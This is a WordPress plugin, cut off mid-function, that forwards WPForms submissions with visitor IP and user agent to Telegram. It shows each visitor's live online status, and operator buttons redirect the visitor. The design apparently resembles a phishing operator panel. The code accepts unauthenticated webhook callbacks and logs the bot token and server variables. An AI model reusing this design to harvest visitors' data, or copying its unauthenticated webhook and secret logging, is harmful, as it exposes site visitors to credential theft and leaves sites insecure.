<?php
/*
Plugin Name: Forms Approval
Description: Manages WPForms submissions via Telegram with grouped submissions, user agent, and action buttons.
Version: 5.0.6
Author: Your Name
*/

// Check for WPForms dependency
register_activation_hook(__FILE__, 'forms_approval_check_dependencies');

function forms_approval_check_dependencies() {
    if (!class_exists('WPForms')) {
        deactivate_plugins(plugin_basename(__FILE__));
        wp_die('Forms Approval requires WPForms to be installed and active.');
    }
}

// Centralized logging function
function forms_approval_log($message) {
    if (
        strpos($message, 'Skipped session start') !== false ||
        strpos($message, 'Skipped heartbeat update') !== false ||
        strpos($message, 'AJAX heartbeat updated') !== false ||
        strpos($message, 'Heartbeat updated') !== false ||
        strpos($message, 'Page updated for Session') !== false
    ) {
        return;
    }
    error_log('Forms Approval: ' . $message);
}

// Start session for visitor tracking
add_action('plugins_loaded', 'forms_approval_start_session', 1);

function forms_approval_start_session() {
    if (is_admin() || defined('DOING_AJAX') || defined('DOING_CRON') || wp_is_json_request()) {
        forms_approval_log('Skipped session start for request: ' . $_SERVER['REQUEST_URI']);
        return;
    }

    if (!isset($_COOKIE['forms_approval_session'])) {
        $cookie_session_id = wp_generate_uuid4();
        setcookie('forms_approval_session', $cookie_session_id, time() + 86400, '/');
        forms_approval_log('Set fallback cookie session ID: ' . $cookie_session_id);
    }

    if (!session_id()) {
        if (headers_sent($file, $line)) {
            forms_approval_log('Headers already sent in ' . ($file ?: 'unknown file') . ' on line ' . ($line ?: 'unknown'));
        }
        if (!session_start()) {
            forms_approval_log('Failed to start session. Using cookie fallback.');
        }
    }
}

// Create or update database tables
register_activation_hook(__FILE__, 'forms_approval_create_tables');

function forms_approval_create_tables() {
    global $wpdb;
    $charset_collate = $wpdb->get_charset_collate();

    $submissions_table = $wpdb->prefix . 'forms_approvals';
    $sql_submissions = "CREATE TABLE $submissions_table (
        id BIGINT(20) UNSIGNED NOT NULL AUTO_INCREMENT,
        visitor_ip VARCHAR(45) NOT NULL,
        session_id VARCHAR(255) NOT NULL,
        form_id BIGINT(20) NOT NULL,
        form_name VARCHAR(255) NOT NULL,
        fields TEXT NOT NULL,
        status VARCHAR(20) DEFAULT 'pending',
        decision VARCHAR(50) DEFAULT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        telegram_message_id BIGINT(20) DEFAULT NULL,
        PRIMARY KEY (id),
        INDEX visitor_ip (visitor_ip)
    ) $charset_collate ENGINE=InnoDB;";

    $sessions_table = $wpdb->prefix . 'forms_approval_sessions';
    $sql_sessions = "CREATE TABLE $sessions_table (
        session_id VARCHAR(255) NOT NULL,
        last_activity DATETIME NOT NULL,
        current_page VARCHAR(255) DEFAULT '',
        PRIMARY KEY (session_id)
    ) $charset_collate ENGINE=InnoDB;";

    require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
    dbDelta($sql_submissions);
    dbDelta($sql_sessions);

    $columns = $wpdb->get_col("SHOW COLUMNS FROM $submissions_table");
    if (in_array('user_ip', $columns)) {
        $wpdb->query("ALTER TABLE $submissions_table DROP COLUMN user_ip");
        forms_approval_log('Dropped user_ip column');
    }
    $wpdb->query("DELETE FROM $submissions_table WHERE visitor_ip = '' OR visitor_ip IS NULL");
    forms_approval_log('Cleaned up invalid visitor_ip rows');
}

// Check table integrity
function forms_approval_check_tables() {
    global $wpdb;
    $submissions_table = $wpdb->prefix . 'forms_approvals';
    $sessions_table = $wpdb->prefix . 'forms_approval_sessions';
    $required_submission_columns = ['id', 'visitor_ip', 'session_id', 'form_id', 'form_name', 'fields', 'status', 'decision', 'created_at', 'telegram_message_id'];
    $required_session_columns = ['session_id', 'last_activity', 'current_page'];

    $submissions_exists = $wpdb->get_var("SHOW TABLES LIKE '$submissions_table'") == $submissions_table;
    $sessions_exists = $wpdb->get_var("SHOW TABLES LIKE '$sessions_table'") == $sessions_table;

    if (!$submissions_exists || !$sessions_exists) {
        forms_approval_log('Table check failed - Submissions: ' . ($submissions_exists ? 'exists' : 'missing') . ', Sessions: ' . ($sessions_exists ? 'exists' : 'missing'));
        return false;
    }

    $submission_columns = $wpdb->get_col("SHOW COLUMNS FROM $submissions_table");
    foreach ($required_submission_columns as $col) {
        if (!in_array($col, $submission_columns)) {
            forms_approval_log('Missing column in submissions table: ' . $col);
            return false;
        }
    }

    $session_columns = $wpdb->get_col("SHOW COLUMNS FROM $sessions_table");
    foreach ($required_session_columns as $col) {
        if (!in_array($col, $session_columns)) {
            forms_approval_log('Missing column in sessions table: ' . $col);
            return false;
        }
    }
    return true;
}

// Admin notice for table issues
add_action('admin_notices', 'forms_approval_table_notice');

function forms_approval_table_notice() {
    if (!forms_approval_check_tables()) {
        ?>
        <div class="notice notice-error">
            <p>Forms Approval: Database tables are missing or incorrect. Please deactivate and reactivate the plugin to fix.</p>
        </div>
        <?php
    }
}

// Admin settings page
add_action('admin_menu', 'forms_approval_settings_menu');

function forms_approval_settings_menu() {
    add_options_page(
        'Forms Approval Settings',
        'Forms Approval',
        'manage_options',
        'forms-approval-settings',
        'forms_approval_settings_page'
    );
}

function forms_approval_settings_page() {
    if (!current_user_can('manage_options')) {
        return;
    }

    if (isset($_POST['forms_approval_save'])) {
        check_admin_referer('forms_approval_settings');

        $forms = [];
        if (!empty($_POST['forms'])) {
            foreach ($_POST['forms'] as $form) {
                if (!empty($form['name']) && !empty($form['id'])) {
                    $forms[] = [
                        'name' => sanitize_text_field($form['name']),
                        'id' => intval($form['id'])
                    ];
                }
            }
        }
        update_option('forms_approval_forms', $forms);

        $buttons = [];
        if (!empty($_POST['buttons'])) {
            foreach ($_POST['buttons'] as $button) {
                if (!empty($button['name'])) {
                    $buttons[] = [
                        'name' => sanitize_text_field($button['name'])
                    ];
                }
            }
        }
        update_option('forms_approval_buttons', $buttons);

        $telegram = [];
        if (!empty($_POST['telegram']['bot_token']) && !empty($_POST['telegram']['chat_id'])) {
            $telegram = [
                'bot_token' => sanitize_text_field(trim($_POST['telegram']['bot_token'])),
                'chat_id' => sanitize_text_field(trim($_POST['telegram']['chat_id']))
            ];
            update_option('forms_approval_telegram', $telegram);
            forms_approval_log('Saved Telegram settings: ' . json_encode($telegram));

            // Set Telegram webhook automatically
            $webhook_url = home_url('/?forms_approval_telegram_callback=1');
            $response = wp_remote_post("https://api.telegram.org/bot{$telegram['bot_token']}/setWebhook", [
                'body' => ['url' => $webhook_url],
                'timeout' => 5
            ]);

            if (is_wp_error($response)) {
                forms_approval_log('Failed to set Telegram webhook: ' . $response->get_error_message());
                echo '<div class="notice notice-error"><p>Failed to set Telegram webhook: ' . esc_html($response->get_error_message()) . '</p></div>';
            } else {
                $response_body = json_decode(wp_remote_retrieve_body($response), true);
                if ($response_body['ok']) {
                    forms_approval_log('Telegram webhook set to: ' . $webhook_url);
                    echo '<div class="notice notice-success"><p>Telegram webhook set successfully.</p></div>';
                } else {
                    forms_approval_log('Failed to set Telegram webhook: ' . ($response_body['description'] ?? 'Unknown error'));
                    echo '<div class="notice notice-error"><p>Failed to set Telegram webhook: ' . esc_html($response_body['description'] ?? 'Unknown error') . '</p></div>';
                }
            }
        } else {
            delete_option('forms_approval_telegram');
            forms_approval_log('Cleared Telegram settings');
            // Clear webhook if Telegram settings are removed
            $old_telegram = get_option('forms_approval_telegram', []);
            if (!empty($old_telegram['bot_token'])) {
                wp_remote_post("https://api.telegram.org/bot{$old_telegram['bot_token']}/setWebhook", [
                    'body' => ['url' => ''],
                    'timeout' => 5
                ]);
                forms_approval_log('Cleared Telegram webhook');
            }
        }

        echo '<div class="notice notice-success"><p>Settings saved.</p></div>';
    }

    $forms = get_option('forms_approval_forms', [['name' => 'Basic', 'id' => '']]);
    $buttons = get_option('forms_approval_buttons', [['name' => 'Login']]);
    $telegram = get_option('forms_approval_telegram', ['bot_token' => '', 'chat_id' => '']);
    ?>
    <div class="wrap">
        <h1>Forms Approval Settings</h1>
        <form method="post" action="">
            <?php wp_nonce_field('forms_approval_settings'); ?>
            <h2>Forms</h2>
            <div id="forms-container">
                <?php foreach ($forms as $index => $form): ?>
                    <div class="form-entry" style="margin-bottom: 10px;">
                        <label>Form Name:</label>
                        <input type="text" name="forms[<?php echo $index; ?>][name]" value="<?php echo esc_attr($form['name']); ?>" required>
                        <label>Form ID:</label>
                        <input type="number" name="forms[<?php echo $index; ?>][id]" value="<?php echo esc_attr($form['id']); ?>" required>
                        <?php if ($index > 0): ?>
                            <button type="button" class="remove-form button">Remove</button>
                        <?php endif; ?>
                    </div>
                <?php endforeach; ?>
            </div>
            <button type="button" id="add-form" class="button">Add Form</button>

            <h2>Buttons</h2>
            <div id="buttons-container">
                <?php foreach ($buttons as $index => $button): ?>
                    <div class="button-entry" style="margin-bottom: 10px;">
                        <label>Button Name:</label>
                        <input type="text" name="buttons[<?php echo $index; ?>][name]" value="<?php echo esc_attr($button['name']); ?>" placeholder="Login" required>
                        <?php if ($index > 0): ?>
                            <button type="button" class="remove-button button">Remove</button>
                        <?php endif; ?>
                    </div>
                <?php endforeach; ?>
            </div>
            <button type="button" id="add-button" class="button">Add Button</button>

            <h2>Telegram Settings</h2>
            <div id="telegram-container" style="margin-bottom: 10px;">
                <div class="telegram-entry">
                    <label>Bot Token:</label>
                    <input type="text" name="telegram[bot_token]" value="<?php echo esc_attr($telegram['bot_token']); ?>" placeholder="e.g., 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11" required>
                    <label>Chat ID:</label>
                    <input type="text" name="telegram[chat_id]" value="<?php echo esc_attr($telegram['chat_id']); ?>" placeholder="e.g., 123456789 or -123456789 for groups" required>
                </div>
            </div>

            <p><input type="submit" name="forms_approval_save" class="button button-primary" value="Save Settings"></p>
        </form>
    </div>
    <script>
        jQuery(document).ready(function($) {
            let formIndex = <?php echo count($forms); ?>;
            $('#add-form').click(function() {
                $('#forms-container').append(
                    '<div class="form-entry" style="margin-bottom: 10px;">' +
                    '<label>Form Name:</label>' +
                    '<input type="text" name="forms[' + formIndex + '][name]" required>' +
                    '<label>Form ID:</label>' +
                    '<input type="number" name="forms[' + formIndex + '][id]" required>' +
                    '<button type="button" class="remove-form button">Remove</button>' +
                    '</div>'
                );
                formIndex++;
            });

            let buttonIndex = <?php echo count($buttons); ?>;
            $('#add-button').click(function() {
                $('#buttons-container').append(
                    '<div class="button-entry" style="margin-bottom: 10px;">' +
                    '<label>Button Name:</label>' +
                    '<input type="text" name="buttons[' + buttonIndex + '][name]" placeholder="Login" required>' +
                    '<button type="button" class="remove-button button">Remove</button>' +
                    '</div>'
                );
                buttonIndex++;
            });

            $(document).on('click', '.remove-form', function() {
                $(this).closest('.form-entry').remove();
            });

            $(document).on('click', '.remove-button', function() {
                $(this).closest('.button-entry').remove();
            });
        });
    </script>
    <?php
}

// Process WPForms submissions and send/update Telegram message
add_action('wpforms_process_complete', 'forms_approval_process', 10, 4);

function forms_approval_process($fields, $entry, $form_data, $entry_id) {
    if (!forms_approval_check_tables()) {
        forms_approval_log('Invalid table structure, aborting submission processing');
        return;
    }

    global $wpdb;
    $forms = get_option('forms_approval_forms', []);
    $form_ids = array_map('intval', array_column($forms, 'id'));
    $form_map = array_column($forms, 'name', 'id');
    $submissions_table = $wpdb->prefix . 'forms_approvals';
    $sessions_table = $wpdb->prefix . 'forms_approval_sessions';
    $wpforms_entries_table = $wpdb->prefix . 'wpforms_entries';
    $form_id = intval($form_data['id']);
    $session_id = session_id() ?: (isset($_COOKIE['forms_approval_session']) ? $_COOKIE['forms_approval_session'] : wp_generate_uuid4());

    forms_approval_log('Processing form ID ' . $form_id . ', Entry ID: ' . $entry_id . ', Session ID: ' . $session_id);

    if (!in_array($form_id, $form_ids)) {
        forms_approval_log('Form ID ' . $form_id . ' not configured');
        return;
    }

    // Get visitor IP and user agent from wp_wpforms_entries
    $entry_data = $wpdb->get_row($wpdb->prepare(
        "SELECT ip_address, user_agent FROM $wpforms_entries_table WHERE entry_id = %d",
        $entry_id
    ), ARRAY_A);
    $visitor_ip = !empty($entry_data['ip_address']) ? sanitize_text_field($entry_data['ip_address']) : 'Unknown';
    $user_agent = !empty($entry_data['user_agent']) ? sanitize_text_field($entry_data['user_agent']) : 'Unknown';
    forms_approval_log('Visitor IP: ' . $visitor_ip . ', User Agent: ' . $user_agent);

    $existing_session = $wpdb->get_row($wpdb->prepare("SELECT visitor_ip, session_id FROM $submissions_table WHERE session_id = %s LIMIT 1", $session_id), ARRAY_A);
    if ($existing_session) {
        $visitor_ip = $existing_session['visitor_ip'];
        forms_approval_log('Reused visitor IP ' . $visitor_ip . ' for session ID ' . $session_id);
    }

    $field_values = [];
    foreach ($fields as $field) {
        if (isset($field['value']) && !empty(trim($field['value'])) && $field['type'] !== 'hidden') {
            $field_values[] = sanitize_text_field($field['name'] . ': ' . $field['value']);
        }
    }

    if (empty($field_values)) {
        forms_approval_log('No valid fields for form ID ' . $form_id);
        return;
    }

    $form_name = isset($form_map[$form_id]) ? $form_map[$form_id] : ($form_data['settings']['form_title'] ?? 'Unknown Form');
    $fields_json = json_encode($field_values);
    $created_at = current_time('mysql');
    $current_page = ucfirst(basename(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH)) ?: 'Homepage');

    $inserted = $wpdb->insert(
        $submissions_table,
        [
            'visitor_ip' => $visitor_ip,
            'session_id' => $session_id,
            'form_id' => $form_id,
            'form_name' => $form_name,
            'fields' => $fields_json,
            'status' => 'pending',
            'created_at' => $created_at
        ],
        ['%s', '%s', '%d', '%s', '%s', '%s', '%s']
    );

    if (!$inserted) {
        forms_approval_log('Insert failed for form ID ' . $form_id . ', Error: ' . $wpdb->last_error);
        return;
    }

    $submission_id = $wpdb->insert_id;
    forms_approval_log('Inserted submission ID ' . $submission_id . ' for form ID ' . $form_id);

    $wpdb->replace(
        $sessions_table,
        [
            'session_id' => $session_id,
            'last_activity' => $created_at,
            'current_page' => sanitize_text_field($current_page)
        ],
        ['%s', '%s', '%s']
    );

    // Handle Telegram notifications immediately
    $telegram = get_option('forms_approval_telegram', []);
    if (!empty($telegram['bot_token']) && !empty($telegram['chat_id'])) {
        $transient_key = 'forms_approval_telegram_' . md5($visitor_ip);
        $pending_notifications = get_transient($transient_key) ?: ['submissions' => [], 'message_id' => null, 'user_agent' => $user_agent];

        $pending_notifications['submissions'][] = [
            'submission_id' => $submission_id,
            'form_name' => $form_name,
            'fields' => $field_values,
            'created_at' => $created_at,
            'user_agent' => $user_agent
        ];

        set_transient($transient_key, $pending_notifications, 3600);
        forms_approval_log('Added submission ID ' . $submission_id . ' to pending notifications for IP ' . $visitor_ip);

        forms_approval_send_telegram($visitor_ip);

        // Schedule status update if not already scheduled
        if (!wp_next_scheduled('forms_approval_update_status')) {
            wp_schedule_event(time(), 'every_minute', 'forms_approval_update_status');
        }
    }
}

// Send or update Telegram message with inline buttons
add_action('forms_approval_send_telegram', 'forms_approval_send_telegram', 10, 1);

function forms_approval_send_telegram($visitor_ip) {
    global $wpdb;
    $telegram = get_option('forms_approval_telegram', []);
    $transient_key = 'forms_approval_telegram_' . md5($visitor_ip);
    $pending_notifications = get_transient($transient_key);
    $submissions_table = $wpdb->prefix . 'forms_approvals';
    $sessions_table = $wpdb->prefix . 'forms_approval_sessions';

    if (empty($pending_notifications) || empty($telegram['bot_token']) || empty($telegram['chat_id'])) {
        forms_approval_log('No pending notifications or Telegram settings for IP ' . $visitor_ip);
        return;
    }

    // Get online status and current page
    $session = $wpdb->get_row($wpdb->prepare(
        "SELECT last_activity, current_page FROM $sessions_table WHERE session_id = (SELECT session_id FROM $submissions_table WHERE visitor_ip = %s LIMIT 1)",
        $visitor_ip
    ), ARRAY_A);
    $current_time = current_time('mysql');
    $thirty_seconds_ago = date('Y-m-d H:i:s', strtotime($current_time . ' -30 seconds'));
    $is_online = $session && $session['last_activity'] >= $thirty_seconds_ago;
    $current_page = $session ? ($session['current_page'] ?: 'Homepage') : 'Homepage';

    // Build message with emojis
    $message = "🌐 Visitor IP: " . esc_html($visitor_ip) . "\n";
    $user_agent = $pending_notifications['user_agent'];
    $message .= "👤 User Agent: " . esc_html($user_agent) . "\n";
    $message .= "─────────────────────\n";
    $message .= "💡 Status: " . ($is_online ? "Online - " . esc_html($current_page) : "Offline") . "\n";
    $message .= "─────────────────────\n";
    foreach ($pending_notifications['submissions'] as $index => $notification) {
        $message .= "#️⃣ Form: " . esc_html($notification['form_name']) . "\n";
        $message .= "✅ Submitted info:\n" . implode("\n", array_map('esc_html', $notification['fields'])) . "\n";
        $message .= "📅 Date: " . esc_html($notification['created_at']) . "\n";
        $message .= "─────────────────────\n";
    }

    // Build inline keyboard
    $buttons = get_option('forms_approval_buttons', [['name' => 'Login']]);
    $session_id = $wpdb->get_var($wpdb->prepare("SELECT session_id FROM $submissions_table WHERE visitor_ip = %s LIMIT 1", $visitor_ip));
    $keyboard = ['inline_keyboard' => [[]]];
    foreach ($buttons as $button) {
        $keyboard['inline_keyboard'][0][] = [
            'text' => $button['name'],
            'callback_data' => 'action:' . strtolower($button['name']) . ':' . $session_id
        ];
    }
    $keyboard['inline_keyboard'][0][] = [
        'text' => 'Delete',
        'callback_data' => 'action:delete:' . $session_id
    ];

    $chat_ids = array_map('trim', explode(',', $telegram['chat_id']));
    $message_id = $pending_notifications['message_id'];

    // Verify message_id exists in Telegram
    if ($message_id) {
        $test_response = wp_remote_post("https://api.telegram.org/bot{$telegram['bot_token']}/getChat", [
            'body' => ['chat_id' => $chat_ids[0]],
            'timeout' => 5
        ]);
        if (is_wp_error($test_response) || !json_decode(wp_remote_retrieve_body($test_response), true)['ok']) {
            forms_approval_log('Invalid message_id detected for IP ' . $visitor_ip . ', resetting');
            $message_id = null;
            $pending_notifications['message_id'] = null;
            set_transient($transient_key, $pending_notifications, 3600);
            $wpdb->update($submissions_table, ['telegram_message_id' => null], ['visitor_ip' => $visitor_ip]);
        }
    }

    foreach ($chat_ids as $chat_id) {
        $body = [
            'chat_id' => $chat_id,
            'text' => $message,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode($keyboard)
        ];

        if ($message_id) {
            // Try to update existing message
            $body['message_id'] = $message_id;
            $response = wp_remote_post("https://api.telegram.org/bot{$telegram['bot_token']}/editMessageText", [
                'body' => $body,
                'timeout' => 5
            ]);

            $response_body = json_decode(wp_remote_retrieve_body($response), true);
            if (is_wp_error($response) || !$response_body['ok']) {
                forms_approval_log('Failed to update Telegram message for IP ' . $visitor_ip . ': ' . ($response_body['description'] ?? $response->get_error_message()));
                // Fall back to sending a new message
                $message_id = null;
                $pending_notifications['message_id'] = null;
                set_transient($transient_key, $pending_notifications, 3600);
                $wpdb->update($submissions_table, ['telegram_message_id' => null], ['visitor_ip' => $visitor_ip]);
            }
        }

        if (!$message_id) {
            // Send new message
            $response = wp_remote_post("https://api.telegram.org/bot{$telegram['bot_token']}/sendMessage", [
                'body' => $body,
                'timeout' => 5
            ]);
        }

        if (is_wp_error($response)) {
            forms_approval_log('Telegram message failed for IP ' . $visitor_ip . ': ' . $response->get_error_message());
            continue;
        }

        $response_body = json_decode(wp_remote_retrieve_body($response), true);
        if ($response_body['ok']) {
            if (!$message_id) {
                $new_message_id = $response_body['result']['message_id'];
                $pending_notifications['message_id'] = $new_message_id;
                set_transient($transient_key, $pending_notifications, 3600);
                $wpdb->update($submissions_table, ['telegram_message_id' => $new_message_id], ['visitor_ip' => $visitor_ip]);
                forms_approval_log('Telegram message sent for IP ' . $visitor_ip . ', Message ID: ' . $new_message_id);
            } else {
                forms_approval_log('Telegram message updated for IP ' . $visitor_ip . ', Message ID: ' . $message_id);
            }
        } else {
            forms_approval_log('Telegram message failed for IP ' . $visitor_ip . ': ' . ($response_body['description'] ?? 'Unknown error'));
        }
    }
}

// Update Telegram message status every minute
add_action('wp_schedule_event', 'forms_approval_schedule_status_update');

function forms_approval_schedule_status_update() {
    if (!wp_next_scheduled('forms_approval_update_status')) {
        wp_schedule_event(time(), 'every_minute', 'forms_approval_update_status');
    }
}

add_action('forms_approval_update_status', 'forms_approval_update_status');

function forms_approval_update_status() {
    global $wpdb;
    $telegram = get_option('forms_approval_telegram', []);
    $submissions_table = $wpdb->prefix . 'forms_approvals';
    $sessions_table = $wpdb->prefix . 'forms_approval_sessions';

    if (empty($telegram['bot_token']) || empty($telegram['chat_id'])) {
        forms_approval_log('No Telegram settings for status update');
        return;
    }

    // Get all visitor IPs with Telegram messages
    $visitor_ips = $wpdb->get_col("SELECT DISTINCT visitor_ip FROM $submissions_table WHERE telegram_message_id IS NOT NULL");

    foreach ($visitor_ips as $visitor_ip) {
        $transient_key = 'forms_approval_telegram_' . md5($visitor_ip);
        $pending_notifications = get_transient($transient_key);
        if (empty($pending_notifications)) {
            forms_approval_log('No pending notifications for IP ' . $visitor_ip);
            // Clear invalid telegram_message_id
            $wpdb->update($submissions_table, ['telegram_message_id' => null], ['visitor_ip' => $visitor_ip]);
            delete_transient($transient_key);
            continue;
        }

        // Get online status and current page
        $session = $wpdb->get_row($wpdb->prepare(
            "SELECT last_activity, current_page FROM $sessions_table WHERE session_id = (SELECT session_id FROM $submissions_table WHERE visitor_ip = %s LIMIT 1)",
            $visitor_ip
        ), ARRAY_A);
        $current_time = current_time('mysql');
        $thirty_seconds_ago = date('Y-m-d H:i:s', strtotime($current_time . ' -30 seconds'));
        $is_online = $session && $session['last_activity'] >= $thirty_seconds_ago;
        $current_page = $session ? ($session['current_page'] ?: 'Homepage') : 'Homepage';

        // Check if status has changed
        $last_status = get_transient('forms_approval_status_' . md5($visitor_ip));
        $current_status = $is_online ? 'Online - ' . $current_page : 'Offline';
        if ($last_status === $current_status) {
            forms_approval_log('No status change for IP ' . $visitor_ip . ', skipping update');
            continue;
        }

        set_transient('forms_approval_status_' . md5($visitor_ip), $current_status, 3600);

        // Build message with emojis
        $message = "🌐 Visitor IP: " . esc_html($visitor_ip) . "\n";
        $user_agent = $pending_notifications['user_agent'];
        $message .= "👤 User Agent: " . esc_html($user_agent) . "\n";
        $message .= "─────────────────────\n";
        $message .= "💡 Status: " . esc_html($current_status) . "\n";
        $message .= "─────────────────────\n";
        foreach ($pending_notifications['submissions'] as $index => $notification) {
            $message .= "#️⃣ Form: " . esc_html($notification['form_name']) . "\n";
            $message .= "✅ Submitted info:\n" . implode("\n", array_map('esc_html', $notification['fields'])) . "\n";
            $message .= "📅 Date: " . esc_html($notification['created_at']) . "\n";
            $message .= "─────────────────────\n";
        }

        // Build inline keyboard
        $buttons = get_option('forms_approval_buttons', [['name' => 'Login']]);
        $session_id = $wpdb->get_var($wpdb->prepare("SELECT session_id FROM $submissions_table WHERE visitor_ip = %s LIMIT 1", $visitor_ip));
        $keyboard = ['inline_keyboard' => [[]]];
        foreach ($buttons as $button) {
            $keyboard['inline_keyboard'][0][] = [
                'text' => $button['name'],
                'callback_data' => 'action:' . strtolower($button['name']) . ':' . $session_id
            ];
        }
        $keyboard['inline_keyboard'][0][] = [
            'text' => 'Delete',
            'callback_data' => 'action:delete:' . $session_id
        ];

        $chat_ids = array_map('trim', explode(',', $telegram['chat_id']));
        $message_id = $pending_notifications['message_id'];

        // Verify message_id exists
        if ($message_id) {
            $test_response = wp_remote_post("https://api.telegram.org/bot{$telegram['bot_token']}/getChat", [
                'body' => ['chat_id' => $chat_ids[0]],
                'timeout' => 5
            ]);
            if (is_wp_error($test_response) || !json_decode(wp_remote_retrieve_body($test_response), true)['ok']) {
                forms_approval_log('Invalid message_id detected for IP ' . $visitor_ip . ', resetting');
                $message_id = null;
                $pending_notifications['message_id'] = null;
                set_transient($transient_key, $pending_notifications, 3600);
                $wpdb->update($submissions_table, ['telegram_message_id' => null], ['visitor_ip' => $visitor_ip]);
            }
        }

        foreach ($chat_ids as $chat_id) {
            $body = [
                'chat_id' => $chat_id,
                'text' => $message,
                'parse_mode' => 'HTML',
                'reply_markup' => json_encode($keyboard)
            ];

            if ($message_id) {
                // Try to update existing message
                $body['message_id'] = $message_id;
                $response = wp_remote_post("https://api.telegram.org/bot{$telegram['bot_token']}/editMessageText", [
                    'body' => $body,
                    'timeout' => 5
                ]);

                $response_body = json_decode(wp_remote_retrieve_body($response), true);
                if (is_wp_error($response) || !$response_body['ok']) {
                    forms_approval_log('Failed to update Telegram message for IP ' . $visitor_ip . ': ' . ($response_body['description'] ?? $response->get_error_message()));
                    // Fall back to sending a new message
                    $message_id = null;
                    $pending_notifications['message_id'] = null;
                    set_transient($transient_key, $pending_notifications, 3600);
                    $wpdb->update($submissions_table, ['telegram_message_id' => null], ['visitor_ip' => $visitor_ip]);
                }
            }

            if (!$message_id) {
                // Send new message
                $response = wp_remote_post("https://api.telegram.org/bot{$telegram['bot_token']}/sendMessage", [
                    'body' => $body,
                    'timeout' => 5
                ]);
            }

            if (is_wp_error($response)) {
                forms_approval_log('Telegram message failed for IP ' . $visitor_ip . ': ' . $response->get_error_message());
                continue;
            }

            $response_body = json_decode(wp_remote_retrieve_body($response), true);
            if ($response_body['ok']) {
                if (!$message_id) {
                    $new_message_id = $response_body['result']['message_id'];
                    $pending_notifications['message_id'] = $new_message_id;
                    set_transient($transient_key, $pending_notifications, 3600);
                    $wpdb->update($submissions_table, ['telegram_message_id' => $new_message_id], ['visitor_ip' => $visitor_ip]);
                    forms_approval_log('Telegram message sent for IP ' . $visitor_ip . ', Message ID: ' . $new_message_id);
                } else {
                    forms_approval_log('Telegram message updated for IP ' . $visitor_ip . ', Message ID: ' . $message_id);
                }
            } else {
                forms_approval_log('Telegram message failed for IP ' . $visitor_ip . ': ' . ($response_body['description'] ?? 'Unknown error'));
            }
        }
    }
}

// Custom cron schedule for every minute
add_filter('cron_schedules', 'forms_approval_add_cron_schedule');

function forms_approval_add_cron_schedule($schedules) {
    $schedules['every_minute'] = [
        'interval' => 60,
        'display' => 'Every Minute'
    ];
    return $schedules;
}

// Handle Telegram callback queries
add_action('init', 'forms_approval_handle_telegram_callback');

function forms_approval_handle_telegram_callback() {
    if (!isset($_GET['forms_approval_telegram_callback'])) {
        return;
    }

    $input = file_get_contents('php://input');
    forms_approval_log('Webhook Received: ' . ($input ?: 'Empty'));
    forms_approval_log('Server Variables: ' . json_encode($_SERVER, JSON_PRETTY_PRINT));
    $data = json_decode($input, true);
    if (!$data || !isset($data['callback_query'])) {
        forms_approval_log('Invalid Telegram callback: ' . json_encode($data));
        wp_die('Invalid callback');
    }

    forms_approval_log('Callback Data: ' . json_encode($data['callback_query']));

    global $wpdb;
    $callback = $data['callback_query'];
    $callback_data = explode(':', $callback['data']);
    if (count($callback_data) !== 3 || $callback_data[0] !== 'action') {
        forms_approval_log('Invalid callback data: ' . $callback['data']);
        wp_die('Invalid callback data');
    }

    $action = sanitize_text_field($callback_data[1]);
    $session_id = sanitize_text_field($callback_data[2]);
    $submissions_table = $wpdb->prefix . 'forms_approvals';
    $sessions_table = $wpdb->prefix . 'forms_approval_sessions';
    $telegram = get_option('forms_approval_telegram', []);

    $visitor_ip = $wpdb->get_var($wpdb->prepare("SELECT visitor_ip FROM $submissions_table WHERE session_id = %s LIMIT 1", $session_id));
    if (!$visitor_ip) {
        forms_approval_log('No visitor IP found for Session ' . $session_id);
        wp_die('Invalid session');
    }

    if ($action === 'delete') {
        $message_id = $wpdb->get_var($wpdb->prepare("SELECT telegram_message_id FROM $submissions_table WHERE session_id = %s LIMIT 1", $session_id));
        $deleted = $wpdb->delete($submissions_table, ['session_id' => $session_id], ['%s']);
        if ($deleted) {
            $wpdb->delete($sessions_table, ['session_id' => $session_id], ['%s']);
            delete_transient('forms_approval_telegram_' . md5($visitor_ip));
            delete_transient('forms_approval_redirect_' . md5($visitor_ip));
            delete_transient('forms_approval_redirect_' . $session_id);
            forms_approval_log('Deleted submissions for Session ' . $session_id);

            if ($message_id) {
                $chat_ids = array_map('trim', explode(',', $telegram['chat_id']));
                foreach ($chat_ids as $chat_id) {
                    $response = wp_remote_post("https://api.telegram.org/bot{$telegram['bot_token']}/deleteMessage", [
                        'body' => [
                            'chat_id' => $chat_id,
                            'message_id' => $message_id
                        ],
                        'timeout' => 5
                    ]);
                    if (is_wp_error($response)) {
                        forms_approval_log('Delete message failed for IP ' . $visitor_ip . ': ' . $response->get_error_message());
                    } else {
                        forms_approval_log('Deleted Telegram message ID ' . $message_id . ' for IP ' . $visitor_ip);
                    }
                }
            }
        } else {
            forms_approval_log('Failed to delete submissions for Session ' . $session_id);
        }
    } else {
        $updated = $wpdb->update(
            $submissions_table,
            ['status' => 'processed', 'decision' => $action],
            ['session_id' => $session_id, 'status' => 'pending'],
            ['%s', '%s'],
            ['%s', '%s']
        );

        if ($updated !== false) {
            $redirect_url = home_url() . '/' . strtolower($action);
            // Store redirect by session ID and visitor IP
            set_transient('forms_approval_redirect_' . $session_id, $redirect_url, 3600);
            set_transient('forms_approval_redirect_' . md5($visitor_ip), $redirect_url, 3600);
            forms_approval_log('Set redirect for Session ' . $session_id . ' and IP ' . $visitor_ip . ' to ' . $redirect_url);
        } else {
            forms_approval_log('Failed to update submission status for Session ' . $session_id);
        }
    }

    $response = wp_remote_post("https://api.telegram.org/bot{$telegram['bot_token']}/answerCallbackQuery", [
        'body' => ['callback_query_id' => $callback['id']],
        'timeout' => 5
    ]);
    if (is_wp_error($response)) {
        forms_approval_log('Answer callback failed: ' . $response->get_error_message());
    }

    wp_die('Callback processed');
}

// Heartbeat for online status
add_action('wp_ajax_forms_approval_heartbeat', 'forms_approval_heartbeat');
add_action('wp_ajax_nopriv_forms_approval_heartbeat', 'forms_approval_heartbeat');

function forms_approval_heartbeat() {
    check_ajax_referer('forms_approval_nonce');
    global $wpdb;
    $session_id = session_id() ?: (isset($_COOKIE['forms_approval_session']) ? $_COOKIE['forms_approval_session'] : false);
    $sessions_table = $wpdb->prefix . 'forms_approval_sessions';

    if (is_admin()) {
